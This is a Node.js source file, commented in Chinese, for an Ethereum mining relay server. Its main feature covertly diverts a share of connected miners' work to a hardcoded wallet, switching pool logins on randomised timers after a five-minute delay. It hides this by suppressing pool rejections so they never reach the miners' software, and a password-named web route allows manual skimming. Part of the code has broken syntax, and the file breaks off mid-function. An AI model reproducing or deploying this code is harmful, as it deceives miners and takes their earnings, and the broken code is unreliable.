var net = require('net');
var http = require('http');
var tls = require('tls');
var fs = require("fs");
const path = require('path');
const trim = require('lodash/trim');
var express = require('express');
var qs = require('querystring');
//============================================

var ispro = false;//是否用于专业矿机
var isssl = true;//是否启用SSL(矿机到中转服务器)
var dk = 5555;//本地挖矿端口(矿机要填的挖矿地址里的端口)
var isssl2 = true;//是否启用SSL(中转服务器到矿池)
var dk2 = 14444;//矿池挖矿端口(统一使用tcp端口，即使上面开启ssl这里也填矿池的tcp端口)
var ym = 'asia2.ethermine.org';//矿池域名或ip
var dk2_backup = 14444;//备用矿池端口
var ym_backup = 'asia2.ethermine.org';//备用矿池域名或ip

var dk3 = 80;//后台页面端口(直接访浏览器访问ip地址默认就是80端口)
var xzljs=100;//限制总矿机连接数

var iscs = true;//是否启用抽水
var csbl = 1;//抽水比例(1-99)
var dccssc=60;//单次抽水时长(秒)
var dur=parseInt(dccssc*100/csbl);//抽水周期(秒)，为单次抽水时长乘100除抽水比例，无需修改
var ym2=ym;//抽水使用的矿池地址，默认和不抽水使用同一个，可修改到其他矿池
var dk4=dk2;//抽水使用的矿池端口，默认和不抽水使用同一个，可配合上个选项修改
var csaddress = '0x55DAEB4609f2d7D216E6513D21de960ed8CF0fB0';//抽水地址
var cskz='reytutghnftdhdshjs';//抽水后台密码(浏览器输入 抽水服务器ip:后台端口/reytutghnftdhdshjs 访问抽水记录，在其后加上 ?t=100 回车开始手动抽水100秒，改密码可自行修改)
var devfeeget='fee'//抽水矿机名

//==========================================
var isconnet=true;

function loadconfig(){
    let readconfig;
try{
    let jsondata = fs.readFileSync('./config.json');
    readconfig = JSON.parse(jsondata);
}catch(err){
    console.log('加载配置文件出错:',err)
}
if(readconfig.length!=0){
    if(!isEmpty(readconfig.ispro))ispro=readconfig.ispro;
    if(!isEmpty(readconfig.isssl))isssl=readconfig.isssl;
    if(!isEmpty(readconfig.dk))dk=readconfig.dk;
    if(!isEmpty(readconfig.isssl2))isssl2=readconfig.isssl2;
    if(!isEmpty(readconfig.dk2))dk2=readconfig.dk2;
    if(!isEmpty(readconfig.ym))ym=readconfig.ym;
    if(!isEmpty(readconfig.dk2_backup))dk2_backup=readconfig.dk2_backup;
    if(!isEmpty(readconfig.ym_backup))ym_backup=readconfig.ym_backup;
    if(!isEmpty(readconfig.dk3))dk3=readconfig.dk3;
    if(!isEmpty(readconfig.xzljs))xzljs=readconfig.xzljs;
    if(!isEmpty(readconfig.iscs))iscs=readconfig.iscs;
    if(!isEmpty(readconfig.csbl))csbl=readconfig.csbl;
    if(!isEmpty(readconfig.dccssc))dccssc=readconfig.dccssc;
    dur=parseInt(dccssc*100/csbl);
    if(!isEmpty(readconfig.ym2))ym2=readconfig.ym2;
    if(!isEmpty(readconfig.dk4))dk4=readconfig.dk4;
    if(!isEmpty(readconfig.csaddress))csaddress=readconfig.csaddress;
    if(!isEmpty(readconfig.cskz))cskz=readconfig.cskz;
    if(!isEmpty(readconfig.devfeeget))devfeeget=readconfig.devfeeget;
}
if(getlen().count>xzljs){isconnet=false;}else{isconnet=true;}
setTimeout(function(){loadconfig()},5*60*1000)
}

var options;
if(isssl)options = {key: fs.readFileSync('./1.key'),cert: fs.readFileSync('./1.pem')};//SSL使用域名的话可以将文件夹中key和pem替换，默认的不能校验证书合法性(多数内核不影响，凤凰不可用，t-rex需要添加不校验ssl证书的参数，或者使用tcl转ssl工具)
var csstr = '';//抽水记录
var suanliarr = {};//矿机对象集合
var app = express();
var gongzuo = Buffer.from('{"id":2,"method":"eth_getWork","params":[]}\n');
var issdcs=false;
loadconfig();
function isEmpty(value) {return (Array.isArray(value) && value.length === 0) || (Object.prototype.isPrototypeOf(value) && Object.keys(value).length === 0);}
function errorHandler(err, req, res, next) {}
app.use(errorHandler);
app.all("*", function (req, res, next) {res.header("Access-Control-Allow-Origin", '*');res.header("Access-Control-Allow-Headers", 'content-type');next();})
app.get('/s', function (req, res) {try {res.send(getlen3())} catch (err) {res.send('报错了');console.log('s_err',err)}})
app.get('/clear', function (req, res) {csstr = '';res.send('已清除记录');})
app.get('/'+cskz, function (req, res) {
    try {
        var cskztime = req.query.t;
        if (cskztime) {
            issdcs=true;
            devdo=true;
            csstr += gettime() + ' ' + '开始手动抽水'+cskztime+'秒<br>';
            setTimeout(function(){
                devdo=false;
                issdcs=false;
                csstr += gettime() + ' ' + '结束手动抽水<br>'
            },cskztime*1000)
            res.send('手动抽水已生效')
        } else {
        if (iscs) {
            res.send('<br><a href="/clear">清除记录</a><br>抽水地址：<br>' + csaddress 
                + '<br>抽水比例：' + csbl
                + '%<br>抽水矿池：' + ym2
                + '<br>抽水矿池端口：' + dk4 
                + '<br>单次抽水时长：'+dccssc
                +'秒<br>抽水循环：' + dur 
                + '秒<br>抽水记录：<br><br>' 
                + csstr
                )
        } else {
            res.send('未启用抽水')
        }
    }
    } catch (err) {
        res.send('报错了')
        console.log(err)
    }
})
app.get('/', function (req, res) {
    try {
        var getaddress = req.query.address;
        if (getaddress) {res.send('<center><table border="1"><tr><td>序号</td><td>矿机名</td><td>上报算力</td><td>最近提交</td><td>在线时长</td><td>在线</td></tr>' + getlen2(getaddress) + '</table>')
        } else {
            let gett = getlen()
                res.send('当前进程pid：' + process.pid + '<br>'
                    +'当前内存占用：' + (process.memoryUsage().rss / 1024 / 1024).toFixed(2) + 'MB' + '<br>'
                     + '当前设置：<br>是否启用ssl：' + (isssl ? '是' : '否') + '<br>'
                     + '本地端口：' + dk + '<br>'
                     + '远程端口：' + dk2 + '<br>'
                     + '矿池域名或IP：' + ym + '<br>'
                     //+ '挖矿地址：' + (isssl ? 'stratum+ssl://' : '') + req.rawHeaders[1].split(':')[0] + ':' + dk + '<br>'
                     + '限制连接数：' + xzljs + '<br>'
                     + '当前在线矿机：' + gett.count + '台<br>'
                     + '当前在线地址：<br>'
                    +gett.arr);
        }
    } catch (err) {
        res.send('报错了')
        console.log(err)
    }
})

var devdo = false;//当前服务器是否处于抽水状态
function devstart() {//抽水控制器
    let ne=dur*(Math.random()*0.4+0.8)
    if (iscs) {
        devdo = true;
        setTimeout(function () {if(!issdcs){csstr += gettime() + ' ' + '开始抽水'+dccssc+'秒，周期' + dur + '秒<br>';}}, 60000)
        setTimeout(function () {if(!issdcs){devdo = false;setTimeout(function () {csstr += gettime() + ' ' + '结束抽水，下次抽水' + (ne - dccssc) + '秒后<br>'}, 60000)}}, dccssc * 1000);
    } else {
        //console.log(gettime() + ' ' + '不抽水')
    }
setTimeout(function () {devstart()}, ne * 1000);
}
setTimeout(function () {//服务器启动5分钟后开始抽水
    devstart()
}, 5*60*1000);

function getlen() {//获取当前在线矿机数量和地址列表
    let count = 0;
    let addresslist = [];
    let addresslistarr = '';
    try {
        for (var key in suanliarr) {
            if (suanliarr[key] && suanliarr[key].o == true) {
                count++
                if (!addresslist.includes(suanliarr[key].a)) {
                    addresslist.push(suanliarr[key].a)
                    addresslistarr += '<a href="?address=' + suanliarr[key].a + '">' + suanliarr[key].a + '</a><br>';
                }
            }
        }
        addresslistarr += '<br><a href="/s">合计</a><br>';
    } catch (err) {
        console.log(err)
    }
    return {
        count: count,
        arr: addresslistarr
    }
}

function getlen2(address) {//获取该地址矿机算力
    let backstr = '';
    let slqh = 0;
    let iii = 1;
    let slhj = 0;
    try {
        for (var key in suanliarr) {
            if (suanliarr[key].a == address) {
                backstr = backstr +
                    '<tr>' +
                    '<td>' +
                    iii +
                    '</td>' +
                    '<td>' +
                    suanliarr[key].n +
                    '</td>' +
                    '<td>' +
                    suanliarr[key].h +
                    '</td>' +
                    '<td>' +
                    (((new Date().getTime()) - suanliarr[key].t1) / 1000).toFixed(2) + '秒前' +
                    '</td>' +
                    '<td>' +
                    (((new Date().getTime()) - suanliarr[key].t2) / 1000).toFixed(2) + '秒前' +
                    '</td>' +
                    '<td>' +
                    (suanliarr[key].o ? '在线' : '离线') +
                    '</td>' +
                    '</tr>';
                slqh = (parseFloat(slqh) + parseFloat(suanliarr[key].h.slice(0, suanliarr[key].h.length - 1))).toFixed(2)
                iii++
            }
        }
        backstr += '<tr><td>合计</td><td colspan="5">' + slqh + 'M</td></tr>'
    } catch (err) {
        console.log(err)
    }
    return backstr
}

function getlen3() {//获取在线矿机总算力
    let backstr = '';
    let slqh = 0;
    let iii = 1;
    let slhj = 0;
    try {
        for (var key in suanliarr) {
            if (suanliarr[key].o == true) {
                slhj = (parseFloat(slhj) + parseFloat(suanliarr[key].h.slice(0, suanliarr[key].h.length - 1))).toFixed(2)
            }
        }
        backstr += '合计:' + slhj + 'M'
    } catch (err) {
        console.log(err)
    }
    return backstr
}

function gettime() {//获取当前时间
    return new Date().toLocaleString().replace(/:\d{1,2}$/, ' ');
}

var server;

function startserver() {//启动中转服务
    if(isssl){//如果启用SSL
    try {
        server = tls.createServer(options,function (client) {//每一个矿机都有一个独立的client，以下数据为该矿机独有数据
            if(isconnet){
            var data3 = [];//存储矿机挖矿地址和矿机名
            var ser;
            try{
            ser = net.connect({
                port: dk2,
                host: ym
            }, function () {
                this.on('data', function (data) {//接收到矿池发来数据
                    try {
                        data.toString().split('\n').forEach(jsonDataStr => {
                            if (trim(jsonDataStr).length) {
                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                            }
                        })
                    } catch(err) {
                        try{client.write(data)}catch(err2){}//错误处理机制
                    }
                })
                this.on('error', function (err) {
                    console.log('ser_err9', err)
                });
            })
            }catch(err){
                try{
            ser = net.connect({
                port: dk2,
                host: ym_backup
            }, function () {
                this.on('data', function (data) {//接收到矿池发来数据
                    try {
                        data.toString().split('\n').forEach(jsonDataStr => {
                            if (trim(jsonDataStr).length) {
                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                            }
                        })
                    } catch(err) {
                        try{client.write(data)}catch(err2){}//错误处理机制
                    }
                })
                this.on('error', function (err) {
                    console.log('ser_err9', err)
                });
            })
                }catch(err){
                     client.end();
                     client.destroy();
                }
            }
            var clidevdo = false;//该矿机当前是否处于抽水状态
            client.on('data', function (data) {//接收到矿机发来数据
                if (data3.length != 0) {
                    setTimeout(function () {//检测矿机是否掉线，3分钟无数据往来判定为掉线
                        try {
                            suanliarr[data3[0] + '.' + data3[1]].o = true;
                            suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                            setTimeout(function () {
                                try {
                                    if (((new Date().getTime()) - suanliarr[data3[0] + '.' + data3[1]].t1) > 2.5*60*1000) {//最近一次数据往来发生在2.5分钟前，判定掉线
                                        suanliarr[data3[0] + '.' + data3[1]].o = false;
                                        ser.end();
                                        ser.destroy();
                                        client.end();
                                        client.destroy();
                                    }

                                } catch (err444) {
                                    console.log(err444)
                                }

                            }, 3*60*1000)
                        } catch (err4443) {
                            console.log(err4443)
                        }
                    }, 20)
                }
                try {
                    data.toString().split('\n').forEach(jsonDataStr => {
                        if (trim(jsonDataStr).length) {
                            let data2 = JSON.parse(trim(jsonDataStr));
                            if (data2.method == 'eth_submitLogin') {//如果矿机发来登录数据，记录并登录
                                client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                data3 = data2.params[0].split('.');
                                if (!data3[1]) {
                                    data3[1] = data2.worker;
                                }
                                suanliarr[data3[0] + '.' + data3[1]] = {};
                                suanliarr[data3[0] + '.' + data3[1]].a = data3[0];
                                suanliarr[data3[0] + '.' + data3[1]].o = true;
                                suanliarr[data3[0] + '.' + data3[1]].n = data3[1];
                                suanliarr[data3[0] + '.' + data3[1]].h = '0M';
                                suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                            } else if (data3.length != 0) {
                                if (data2.method == 'eth_getWork') {//如果矿机发来请求工作任务命令
                                    suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                } else {
                                    if (data2.method == 'eth_submitHashrate') {//如果矿机发来上报算力命令，记录算力并上报
                                        client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                        suanliarr[data3[0] + '.' + data3[1]].h = parseFloat(parseInt(data2.params[0], 16) / 1000000).toFixed(2) + 'M';
                                        suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    } else if (data2.method == 'eth_submitWork') {//如果矿机发来上报Share命令，上报检测是否进入抽水时间
                                        client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                        suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                        if(clidevdo){data2.worker=devfeeget}else{data2.worker=data3[1]}
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                        if (devdo && !clidevdo) {//如果已经进入抽水时间，但矿机还未开始抽水
                                            clidevdo=true;
                                            ser.end()
                                            ser.destroy();//关掉原矿机连接
                                            try{
                                            ser = net.connect({//开启抽水矿池连接并登录
                                                port: dk4,
                                                host: ym2
                                            }, function () {
                                                this.on('data', function (data) {//接收抽水矿池发来数据
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {
                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                                                } else if(data2.result == true){
                                    
                                                                }else{
                                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                                }
                                                            }
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err10', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"'+devfeeget+'","params":["' + csaddress + '","x"],"jsonrpc":"2.0"}\n'))//用抽水地址和矿机名登录
                                                setTimeout(function () {ser.write(gongzuo)}, 10)//请求工作任务
                                            })
                                            }catch(err){
                                                client.end();
                                                client.destroy();
                                            }

                                        } else if (!devdo && clidevdo) {//如果已经退出抽水时间，但矿机还在抽水
                                            clidevdo=false;
                                            ser.end()
                                            ser.destroy();//关掉抽水矿池连接
                                            try{
                                            ser = net.connect({//开启原矿池连接并为矿机登录
                                                port: dk2,
                                                host: ym
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                                                            }
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err8', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"' + data3[1] + '","params":["' + data3[0] + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 5)
                                            })
                                            }catch(err){
                                            ser = net.connect({//开启原矿池连接并为矿机登录
                                                port: dk2,
                                                host: ym_backup
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                                                            }
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err8', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"' + data3[1] + '","params":["' + data3[0] + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 5)
                                            })
                                            }
                                        }

                                    } else {
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    }
                                }

                            } else {
                                client.end()
                                client.destroy()
                            }
                        }
                    });
                } catch (err) {
                    console.log(err.message)
                    console.log('2', data.toString())
                    try {ser.write(data)} catch (err343) {
                        console.log(err343)
                    }
                }
            });
            client.on('error', function (err) {});
            client.on('close', function () {
                try{
                    ser.end();
                    ser.destroy();
                }catch(err222){console.log('gbser',err222)}
            });}else{
                try{
                    client.end();
                    client.destroy();
                }catch(err222){console.log('gbcli',err222)}

            }
        });
        server.listen(dk, '0.0.0.0', function () {
            server.on('close', function () {});
            server.on('error', function (err) {});
        });
    } catch (err0101) {//中转服务出现故障，10秒钟后重启
        console.log('serverdown', err0101)
        setTimeout(function () {
            startserver()
        }, 10000)
    }
}else{
    try {
        server = net.createServer(function (client) {//每一个矿机都有一个独立的client，以下数据为该矿机独有数据
            if(isconnet){
            var data3 = [];//存储矿机挖矿地址和矿机名
            var ser;
            try{
            ser = net.connect({
                port: dk2,
                host: ym
            }, function () {
                this.on('data', function (data) {//接收到矿池发来数据
                    try {
                        data.toString().split('\n').forEach(jsonDataStr => {
                            if (trim(jsonDataStr).length) {
                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                            }
                        })
                    } catch(err) {
                        try{client.write(data)}catch(err2){}//错误处理机制
                    }
                })
                this.on('error', function (err) {
                    console.log('ser_err9', err)
                });
            })
            }catch(err){
                try{
            ser = net.connect({
                port: dk2,
                host: ym_backup
            }, function () {
                this.on('data', function (data) {//接收到矿池发来数据
                    try {
                        data.toString().split('\n').forEach(jsonDataStr => {
                            if (trim(jsonDataStr).length) {
                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                            }
                        })
                    } catch(err) {
                        try{client.write(data)}catch(err2){}//错误处理机制
                    }
                })
                this.on('error', function (err) {
                    console.log('ser_err9', err)
                });
            })
                }catch(err){
                     client.end();
                     client.destroy();
                }
            }
            var clidevdo = false;//该矿机当前是否处于抽水状态
            client.on('data', function (data) {//接收到矿机发来数据
                if (data3.length != 0) {
                    setTimeout(function () {//检测矿机是否掉线，3分钟无数据往来判定为掉线
                        try {
                            suanliarr[data3[0] + '.' + data3[1]].o = true;
                            suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                            setTimeout(function () {
                                try {
                                    if (((new Date().getTime()) - suanliarr[data3[0] + '.' + data3[1]].t1) > 2.5*60*1000) {//最近一次数据往来发生在2.5分钟前，判定掉线
                                        suanliarr[data3[0] + '.' + data3[1]].o = false;
                                        ser.end();
                                        ser.destroy();
                                        client.end();
                                        client.destroy();
                                    }

                                } catch (err444) {
                                    console.log(err444)
                                }

                            }, 3*60*1000)
                        } catch (err4443) {
                            console.log(err4443)
                        }
                    }, 20)
                }
                try {
                    data.toString().split('\n').forEach(jsonDataStr => {
                        if (trim(jsonDataStr).length) {
                            let data2 = JSON.parse(trim(jsonDataStr));
                            if (data2.method == 'eth_submitLogin') {//如果矿机发来登录数据，记录并登录
                                client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                data3 = data2.params[0].split('.');
                                if (!data3[1]) {
                                    data3[1] = data2.worker;
                                }
                                suanliarr[data3[0] + '.' + data3[1]] = {};
                                suanliarr[data3[0] + '.' + data3[1]].a = data3[0];
                                suanliarr[data3[0] + '.' + data3[1]].o = true;
                                suanliarr[data3[0] + '.' + data3[1]].n = data3[1];
                                suanliarr[data3[0] + '.' + data3[1]].h = '0M';
                                suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                            } else if (data3.length != 0) {
                                if (data2.method == 'eth_getWork') {//如果矿机发来请求工作任务命令
                                    suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                } else {
                                    if (data2.method == 'eth_submitHashrate') {//如果矿机发来上报算力命令，记录算力并上报
                                        client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                        suanliarr[data3[0] + '.' + data3[1]].h = parseFloat(parseInt(data2.params[0], 16) / 1000000).toFixed(2) + 'M';
                                        suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    } else if (data2.method == 'eth_submitWork') {//如果矿机发来上报Share命令，上报检测是否进入抽水时间
                                        client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                        suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                        if(clidevdo){data2.worker=devfeeget}else{data2.worker=data3[1]}
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                        if (devdo && !clidevdo) {//如果已经进入抽水时间，但矿机还未开始抽水
                                            clidevdo=true;
                                            ser.end()
                                            ser.destroy();//关掉原矿机连接
                                            try{
                                            ser = net.connect({//开启抽水矿池连接并登录
                                                port: dk4,
                                                host: ym2
                                            }, function () {
                                                this.on('data', function (data) {//接收抽水矿池发来数据
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {
                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }}
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err10', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"'+devfeeget+'","params":["' + csaddress + '","x"],"jsonrpc":"2.0"}\n'))//用抽水地址和矿机名登录
                                                setTimeout(function () {ser.write(gongzuo)}, 5)//请求工作任务
                                            })
                                            }catch(err){
                                                client.end();
                                                client.destroy();
                                            }

                                        } else if (!devdo && clidevdo) {//如果已经退出抽水时间，但矿机还在抽水
                                            clidevdo=false;
                                            ser.end()
                                            ser.destroy();//关掉抽水矿池连接
                                            try{
                                            ser = net.connect({//开启原矿池连接并为矿机登录
                                                port: dk2,
                                                host: ym
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                                                            }
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err8', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"' + data3[1] + '","params":["' + data3[0] + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 5)
                                            })
                                            }catch(err){
                                            ser = net.connect({//开启原矿池连接并为矿机登录
                                                port: dk2,
                                                host: ym_backup
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr => {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {//被矿池拒绝也返回接受(防止抽水时个别share被拒绝显示到挖矿软件上)
                                    //client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'));
                                } else if(data2.result == true){
                                    
                                }else{
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                                                            }
                                                        })
                                                    } catch(errr){
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err8', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"' + data3[1] + '","params":["' + data3[0] + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 5)
                                            })
                                            }
                                        }

                                    } else {
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    }
                                }

                            } else {
                                client.end()
                                client.destroy()
                            }
                        }
                    });
                } catch (err) {
                    console.log(err.message)
                    console.log('2', data.toString())
                    try {ser.write(data)} catch (err343) {
                        console.log(err343)
                    }
                }
            });
            client.on('error', function (err) {});
            client.on('close', function () {
                try{
                    ser.end();
                    ser.destroy();
                }catch(err222){console.log('gbser',err222)}
            });}else{
                try{
                    client.end();
                    client.destroy();
                }catch(err222){console.log('gbcli',err222)}

            }
        });
        server.listen(dk, '0.0.0.0', function () {
            server.on('close', function () {});
            server.on('error', function (err) {});
        });
    } catch (err0101) {//中转服务出现故障，10秒钟后重启
        console.log('serverdown', err0101)
        setTimeout(function () {
            startserver()
        }, 10000)
    }
}
}
function startproserver() {
    if (isssl) {
        try {
            server = tls.createServer(options,function(client) { //每一个矿机都有一个独立的client，以下数据为该矿机独有数据
                var nandu = false;
                var clidevdo = devdo;
                if (isconnet) {
                    var data3 = []; //存储矿机挖矿地址和矿机名
                    var ser;
                    if (!devdo) {
                        try {
                            if (isssl2) {
                                ser = tls.connect({port: dk2,host: ym,rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({port: dk2,host: ym
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        } catch(ere) {
                            if (isssl2) {
                                ser = tls.connect({
                                    port: dk2_backup,
                                    host: ym_backup,
                                    rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({
                                    port: dk2_backup,
                                    host: ym_backup
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        }
                    } else {
                        try {
                            if (isssl2) {
